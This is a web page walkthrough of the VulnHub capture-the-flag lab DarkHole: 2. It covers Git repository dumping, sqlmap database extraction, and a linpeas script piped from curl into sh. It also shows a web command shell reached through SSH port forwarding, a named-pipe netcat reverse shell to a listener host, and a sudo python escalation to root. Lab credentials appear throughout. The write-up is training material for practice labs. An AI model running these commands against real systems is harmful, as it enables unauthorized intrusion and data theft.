@@ -1,0 +1,134 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
+            <h1 class="post-title entry-title">DarkHole: 2 Vulnhub Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/darkhole-2-vulnhub-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2021-12-14T16:29:07+00:00">December 14, 2021</time><time class="updated" datetime="2025-07-07T17:39:32+00:00">July 7, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;"><a href="https://www.vulnhub.com/entry/darkhole-2,740/"><strong>DarkHole: 2</strong></a> is a medium-hard machine created by Jihad Alqurashi for Vulnhub. This system is also put through its paces in VirtualBox. This lab is appropriate for certain experienced CTF players who want to test their talents in these settings. So, let’s get started and figure out how to divide things down into small chunks.</span></p>
+<h3><span style="color: #800000;"><strong>Pentesting Methodology</strong></span></h3>
+<p><span style="color: #000000;"><strong>Network Scanning</strong></span></p>
+<ul>
+<li><span style="color: #000000;">netdiscover</span></li>
+<li><span style="color: #000000;">nmap</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Enumeration</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Abusing HTTP</span></li>
+<li><span style="color: #000000;">gitdumper tool</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Exploitation</strong></span></p>
+<ul>
+<li><span style="color: #000000;">SQL injection</span></li>
+<li><span style="color: #000000;">ssh</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Privilege Escalation</strong></span></p>
+<ul>
+<li><span style="color: #000000;">linpeas.sh</span></li>
+<li><span style="color: #000000;">Netcat reverse shell</span></li>
+<li><span style="color: #000000;">User flag</span></li>
+<li><span style="color: #000000;">bash history</span></li>
+<li><span style="color: #000000;">Root flag</span></li>
+</ul>
+<p><span style="color: #000000;">Level: Medium-Hard</span></p>
+<p><span style="color: #000000;"><strong>Network Scanning</strong></span></p>
+<p><span style="color: #000000;">To begin, we must use the netdiscover command to scan the network for the victim machine’s IP address.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">netdiscover</pre>
+<p><span style="color: #000000;">Our IP address is <strong>192.168.1.179.</strong></span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEiXTKCYvRjr6Qa39q_hHa0RFIFK7qcR44D3KKWTo5to3znp3SRA1k2UC5J3TWhlsg2OGCllo5CDNZt4aDEx_PcMIBILa4HS4NbNnwlA836q-w5CjK03B_ddGn_fwYcnEw6y9o0IVtvVXBnlB5jmGN2SZCSlljsgUqPLrdADWOtykPQ7smrTC8jbTxfE4w=s16000"/></span></p>
+<p><span style="color: #000000;">We are now initiating Nmap to advance in this process. We did an aggressive scan (-A) for open port enumeration and discovered the following ports information:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -A 192.168.1.179</pre>
+<p><span style="color: #000000;">According to the Nmap output, we have</span></p>
+<ul>
+<li><span style="color: #000000;">an SSH server running on port 22</span></li>
+<li><span style="color: #000000;">an HTTP service running (Apache Server) on port 80, as well as an http-git page.</span></li>
+</ul>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEi5SJXVgdnuGKxNQSTuftoyt2JjYEvg_1zOHwA9gDDzt4SSb47inEB5wC9XFXohGu32Njx4zRgE8YdLhDBYIWRSK-4hJlR5pMjy35Q_61A-awpGmVok0CiaLb6pP7bIToYViYNeW20nYvEMoj14n-I0U09QMtTv-O6PP-MnvVI9lMQXVjD_UasXzcC33Q=s16000"/></span></p>
+<h3><span style="color: #800000;"><strong>Enumeration</strong></span></h3>
+<p><span style="color: #000000;">First, we’ll try to utilize HTTP. Let’s check port 80 to see if anything interesting comes up. Because the Apache Server is listening on port 80, we can immediately verify it in the browser.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEhj3vQH88_dWcKQyrVmMOGAYewdNn6YtyrtwAZM5F_JFnp6TzI-A5Fhh2h9KlOSxiTAVHYLMeJ4YJ8B6p6DGv9OocZAGBzpdjOjRu2nD5ym-sSfPbmXzen_F4aEJFL8mIlEJ01XD8cK0RgZ4u87ihXRSgFJ_W11SIO3Jt87jADESxydSbc_UuRHvXMiTw=s16000"/></span></p>
+<p><span style="color: #000000;">Except for the login page, the site contains no useful information. So, we decided to have a sneak peek at the login page.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEiCwq16mon2FJ-KIvcBRaJYtA67YbLwJ6eF-Sepc-ZSAec8opB_zeuL0w-mlzsA9SuQULDPWbvhlHFDvbbF06B8vCzc8tfjr5s3IJObhSoqQnIucVHG02ZRIp6u23xn1CROBzsA7a1mhJBZ2Fbvebbu4hL4iq1L4S_QA-16wLbimgWSPtdk0FdImySyRg=s16000"/></span></p>
+<p><span style="color: #000000;">Then we decided to have a look at the http-git page that we discovered previously during the Nmap aggressive scan.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEi6XhioBLjHvMza2VXkMALuhzWnrt6M_G4-vojrl_rrWvE7MGC0cCiX0-ybDdpdxjV0cpaFltze9fVKaT_8AEBEBtWRSoUoNCSMRoEN3rPYWRJBMMGbTBG-LsmE52gROF9BZ9RwTlWJSGiEJBNb0sgZOrVkyh29CVGgD0CQkWQ1QhDezNtcJjjEvP2C-A=s16000"/></span></p>
+<p><span style="color: #000000;">We’ve introduced a tool called gitdumper to improve the aesthetics of this http-git page. It is a tool for acquiring a git repository from a website to gain a better grasp of the data set.</span></p>
+<p><span style="color: #000000;">We simply use the git clone function to install this.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">git clone https://github.com/arthaud/git-dumper.git
+cd git-dumper</pre>
+<p><span style="color: #000000;">After downloading the tool, we attempt to run it with python.</span></p>
+<p><span style="color: #000000;">Another thing we must do is offer them a directory name in which to save these git logs (in our case we named this as a backup for this http-git page).</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">mkdir backup
+python3 git_dumper.py http://192.168.1.179/.git/ backup</pre>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEiT29Oqv7yZMZBHQzCk6hKCpbj7TyN3dhxHhRytTr71H3NgziNQX2udgVCY89iKRmpsL_yu_1LH_i4sd1gmDGT52-xV_vttnbNBtS3z9xUVHq3kDc1C4_2Mn5ZtK8zaWRdrTdp6haL67O7PfRbnkqtsDhCvl3odmb2qcVTOLFvgtI5PGFR0cpOL3Fk8Ug=s16000"/></strong></span></p>
+<p><span style="color: #000000;">After that, we accessed the backup directory, and the log file had three entries. Using git, we opened one of the entries to progress in this lab.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd backup
+git log
+git diff a4d900a8d85e8938d3601f3cef113ee293028e10</pre>
+<p><span style="color: #000000;">Finally, we discovered the login page credentials discovered before during http abuse.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">Email: lush@admin.com
+Password: 321</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjo00TFyBn5tyatnqvHADdQAm_nbpLEo6yIL2v5K2aQgOt06UdxQvOx7JXKrTBvbU33oQjg9D7Gd6ouZEEo56VqWwceF8_zl5iNIXHQVtlzAlL0GEhGNhpTdZNEwpr00b6RADtF2w497gLZHk3cWQ7snm9wrDtiTXroRdAfVW5gvouHSm73yvbjTT5U4g=s16000"/></span></p>
+<h3><span style="color: #800000;"><strong>Exploitation</strong></span></h3>
+<p><span style="color: #000000;">We were directed to a strange page after checking in on that page, which we thought was suitable for SQL injection-related tactics.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEin6mds8mGlOR2Wmj6_f8udxTvweX9DMNi9WSS-mHzwDixZ7dqjRMVnJ8xuRhCLOBGfuYCageZEl-UwdbDv142SUfy4_gDpHz85fBvhX8pACuyVo37tsHIv950ifRFShjCAT9OCaiBrfEpyxuUAWzlx6aEGEMNaNuAP7-v2LJ870MkITr7_xYkR8nscyg=s16000"/></span></p>
+<p><span style="color: #000000;">So, we used a burp suite to gather this page’s cookies. It will be advantageous for our SQL injection strategy.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjt70lD7SOdcfdcESTehav_vpwGY4h6cmF_UJi4KVnJt1qvaAGxprt0nIRmNmVr6iSI1Ab9AFdDE9PnVTgqzO7sVqXeTvoJB-eUbY5UGknFqimKmP-V6k49pfVN_bRu0La7Ug1_2SBFX_BOhgcRAKgFZ8gvvq1BJxW6gB3yGQfhsimrCOtYHVDB3upWyQ=s16000"/></span></p>
+<p><span style="color: #000000;">These cookies were saved in a file called “sql” using the nano command. We initiated a sqlmap attack using this file, requesting the databases.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nano sql
+sqlmap -r sql --dbs --batch</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEja0kqekwbiUqJburCCruXcxRsk-RZThhg1bmLMtsLq5Q2-kQ0PDCsTzKI52va2OtxCuXGFD4tU9LbJgb3-XRDLaE9vD75wd1GW4T9rQRQY2Y4hjP-7wPODow4WrnscMR3dySbraXSZmIkQFqx0YgzxC8tRanGDbYfIU3FrZFCMTOmOQKKsscRefvk03w=s16000"/></span></p>
+<p><span style="color: #000000;">We obtained a few databases in a matter of minutes. So, we initiated another command (using the -D parameter) for dumping the database named darkhole_2.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">sqlmap -r sql -D darkhole_2 --dump-all --batch</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgYu8JjIEht0Ur-GEtxUOk7bSen77vpLKcnYUtdt_K_zloXZqMACD-eDYlXFohwwY1e7IA7WGpsBGSm1rEmhKhGQ4Gs-h6FCPq7GbP-dOVZuksyghtHRRmGRmjzB38_O-pUNWkK2nJIfmWgmKGXwFHBfLgZ2ubnbr8adBKLosMxGRjzjy9Uo947KZyVPw=s16000"/></span></p>
+<p><span style="color: #000000;">In a matter of moments, we discovered ssh credentials for the user Jehad in this dump database.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">User: jehad
+Pass: fool</pre>
+<p><span style="color: #000000;"><strong><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjI1l3CnG589h2HTGO5O5gX9_JSua3RyzhF05cj_7OSUpDO3WBULfEpGnNsE_w4xTgvByR1tK9J5H2yylXfYP1XsKttWHh99YCGMZpswAYTT6rvO6gssBNz4eKkNap9AfHSQyCir7MXSin7mFWMlnMR7lUOUC3ovrfrH97vntqLjWMi3XwAhMA8sHXfKQ=s16000"/></strong></span></p>
+<p><span style="color: #000000;">Now, using these ssh credentials, we logged in with the user Jehad and opened its id to authenticate it.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">ssh jehad@192.168.1.179
+id</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgIyzYBixzw4g95TXAnXx67XPbxsBu5bqfS-P2LCSAkzNx50ys8zCUCLTm7vxtVBy4h1F8VhtzgqCCLjEL9oVX9_oDNQcRVgic2mUfgJ1k0zdVy_20m7Qjd2zwPcB3xz7FeuEWUzzjr6cazq4UZiaW4S3Xe12mMcOl6H1IVmuIo4WV0msj8nV7yAsuWXw=s16000"/></span></p>
+<h3><span style="color: #800000;"><strong>Privilege Escalation</strong></span></h3>
+<p><span style="color: #000000;">It’s time to start the privilege escalation process. We switched to the <strong>tmp</strong> folder and tried to run the <span style="color: #0000ff;"><a style="color: #0000ff;" href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS"><strong>Linpeas</strong> </a></span>script with curl. This is a script that searches for potential paths to elevate privileges on Linux hosts and highlights them for a better understanding of those instances with potential exploits.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">curl https://raw.githubusercontent.com/carlospalop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh | sh</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjdTqGZDJM0ex5b6vCyvYUoxLIZob0gtC33gpOSDt0JV3rV-jjDK9m2gAZO0W11g5wMrhN7fOqO0ttbcixPzf3GuOKpvl9bKxHElgiWsHh0_J8hlz5lawjr_cqLFDcY0Yn8bk3loKBrgRuvNdYwPoqs3dhToL7ctiAksYY3bRasPCV1QFKF5lK3lQSXhw=s16000"/></span></p>
+<p><span style="color: #000000;">After running it, we saw that a PHP page for the user Losy was available on localhost port 9999. As a result, we’ve devised a plan to use local port forwarding to go to that page.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEhkd-2Zgwy0MNv8k7LbH4nVB49EeeDPIi6wRl_pAe9qdrxtWJvxI1-Whv0mLTGxwrmML2dAcDo45_vz76bgAzExcCNbEeM5jJAyt4Mxl2lHxj9WPatpGulOPxFlyWzqlowgCWRwAFlpYOYDwrl2Q73Rrfrn_7qpJ_EWtAIe1Z5fP-Wx-CjLS0hZ12mNqw=s16000"/></span></p>
+<p><span style="color: #000000;">First, we went to the previously mentioned directory and discovered an index.php file. This tells us that we can get a command prompt (cmd) by using the previously discussed local port forwarding method for the user losy.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd /opt/web
+cat index.php</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgUp0wFtSrNL17D0CNDobsV23Y4T_D_052sVSa3949L_E-Cii8b9C1EZaqvANnachdEoaUnsc8bs-6JNkfmoPUH9pucflZvoztcz5DwPTna8YiPKhIrq4QRFTvzZf4edykxejyMD7ZoueX59x7U8bEJ7GCMjcVuXp8lF-dXL3Zke6BoV_y0kWVpYntr_g=s16000"/></span></p>
+<p><span style="color: #000000;">It is now time to launch this assault. We attempt to login as the jehad user, using the details of local port forwarding provided in the above results we achieved.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">ssh jehad@192.168.1.179 -L 9999:localhost:9999</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgR26p_z0kli_TMSC4xYJUylfMzGMn6nHw4Ad-NCOJDr8kCW5gUX9UUVQyZLzJeFZzD0A_L1pKV2_ULryJVcaVvi-nG9hFwJapU92CjVrAHy9aFCdEuT5FKfrw7I7W1mYUt1P2xLVSvIJH89vEyiTAnIDbWRsAJVyMrxj45W_T_rMxYU2qKTX2GU6DEgg=s16000"/></span></p>
+<p><span style="color: #000000;">Following that, we saw the user losy’s command prompt in the web browser. We authenticate this by collecting this user’s id.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://127.0.0.1:9999/?cmd=id</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgrGzoOQk-Vk9vWwFW_jtb3co8A0P1Cn7VIBlSu_ohBL4H4OWNAUX9oByEQdbXnP6kl8nMnGHmMbpIc6fo2unNWiQfY6K_OzmscDUE0QxApWygN1pT2DU4LgffD60BsRd2tSY1SXyBuMOpYaMWbwUuVVv3aBwlXMIP_WgMHo704DikFmHbckZX0_wmKMA=s16000"/></span></p>
+<p><span style="color: #000000;">Using a netcat reverse shell on this browser as this user’s cmd. We attempted a standard methods command, but it did not work in this circumstance. So, we attempted this attack after encoding it using the burp suite decoder.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">rm /tmpf;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.1.3:8888 &gt;/tmp/f</pre>
+<p><span style="color: #000000;"><strong><em><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEhZJKQ-N6evvk5KGAMzO_3o6RnvTLzppLj2XnWqy7B9rcBWygZzBQn6H-ztMh37eHCKJt9tppqxuiuHRjHKMUq58RGYbdyGetK_kQjGz6CF7FZYKi-8zo3qjJEpwfmA65YyjIvHFDtcTcT5i80ElGby6ESot3tjguTbT59cBvZgctQ6HU_JrwP0hh3AOQ=s16000"/></em></strong></span></p>
+<p><span style="color: #000000;">After that, we used a web browser and opened a Netcat listener on the opposite side to catch the reverse shell.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEiSN-ZVbQB5cwhCEoaT6hOY_sAsYYi485M8Wzv6QKWcMzKf631YnnpCM73H-L502FJG9IEMkWxYFX1-5OzIDKk-_csH4ooGXH80yacS0jz_FdVI_qq_A_566S4VFXSb6cBm07-6NKgvZFrHGnMWi5Z0uNmmsldxtMBx80AbGYKBRqKvA3Lg-Rq0n5XA_w=s16000"/></span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nc -lvp 8888
+python3 -c 'import pty; pty.spawn("/bin/bash")'</pre>
+<p><span style="color: #000000;">We obtained the user losy and the user flag of this lab after capturing the reverse shell.</span></p>
+<p><span style="color: #000000;">Then, we discovered the bash history of this lab in a folder, which can be quite beneficial in obtaining root.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd /home/losy
+cat user.txt
+cat .bash_history</pre>
+<p><span style="color: #000000;"><strong><em><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjaxgNwuSs7ULXsFX7gLinzYwUz89JXIiGHfprW4xzo3xiqgeVC_oynBBNFjHxDy5xN_kU1rbhm2FQMz8MdNCVRznTzT7LZFx2_0SmnMzDt02XxuyEuqKF5YPCyVZLz1D2LmuQSmg8-bHTYfPN4L4K0IkKBY2UzwagOYh2BeQPCxCGQlqAqTojfo4aBtA=s16000"/></em></strong></span></p>
+<h5><span style="color: #000000;">We discovered losy’s login credentials in this bash history file.</span></h5>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">losy: gang</pre>
+<p><span style="color: #000000;">Following that, we tested this user’s sudo permissions. We discovered that we could reach the root using a python one-liner.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEiXZ8lXN7btde8EU2an1ZfCWY6OX8d1pGJ3FHS16yahRFv3iPDO2F3L2uMeRp_Gi7RnL9UQNawiV_TikcN9QXg8jX9eKl4YcZXy9_YcsSAY8EbQEi-waUU3kehs_83EMtnf03ebpk5FCdttcv1XKaKCBM-U0FdHUgWcYW89sxRoK8mOTISA4fjTT4evuQ=s16000"/></span></p>
+<p><span style="color: #000000;">Now run this python one-liner with sudo and the losy credential.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">sudo python3 -c 'import pty; pty.spawn("/bin/bash")'</pre>
+<p><span style="color: #000000;">Hurray!! We obtained the well as root flag. I must add that it was a great activity to complete, and I applaud the author for creating this lab.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cat root.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgxHSWy97gMDymA7uFakJKToMLom42qLY5j4OQbIROC51PJVsvI-DsIqxg5CsDitdEtyOK38yakCTu419RKq8FZbltinWoHIGhPUeVkc6D_cn2T9J-e8PxMckUOTBs-OHrENTPsmsj0TH14tKEJwHGH_ygzLgS7kJf5cylWQrm78d91__T0BGIiXYynNQ=s16000"/></span></p>
+<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. If you want to read more VulnHub Write-ups. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/">Link.</a></strong> <span style="color: #000000;">Happy Hacking!</span></p>
+<p><span style="color: #000000;"><strong>Author</strong>: Shubham Sharma is a passionate Cybersecurity Researcher, contact <span style="color: #0000ff;"><strong><u><a style="color: #0000ff;" href="https://www.linkedin.com/in/shubham-sharma-626964153/">LinkedIn</a></u></strong> </span>and <span style="color: #0000ff;"><strong><u><a style="color: #0000ff;" href="https://twitter.com/Shubham_pen">Twitter</a></u></strong></span>.</span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
